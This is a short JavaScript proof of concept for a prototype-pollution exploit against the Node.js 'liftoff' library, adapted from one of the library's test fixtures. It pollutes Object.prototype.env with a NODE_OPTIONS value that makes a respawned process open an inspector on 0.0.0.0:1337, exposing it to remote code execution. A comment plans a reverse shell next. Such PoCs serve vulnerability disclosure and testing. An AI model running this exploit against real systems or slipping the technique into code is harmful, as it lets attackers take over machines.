// the PoC is based on https://github.com/gulpjs/liftoff/blob/main/test/fixtures/respawn_and_require.js
const Liftoff = require('liftoff');

const Hacker = new Liftoff({ name: 'hacker' });

Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

Hacker.prepare({}, function (env) {
  var forcedFlags = ['--lazy'];
  Hacker.execute(env, forcedFlags, function (env) {
    // Do post-execute things
  });
});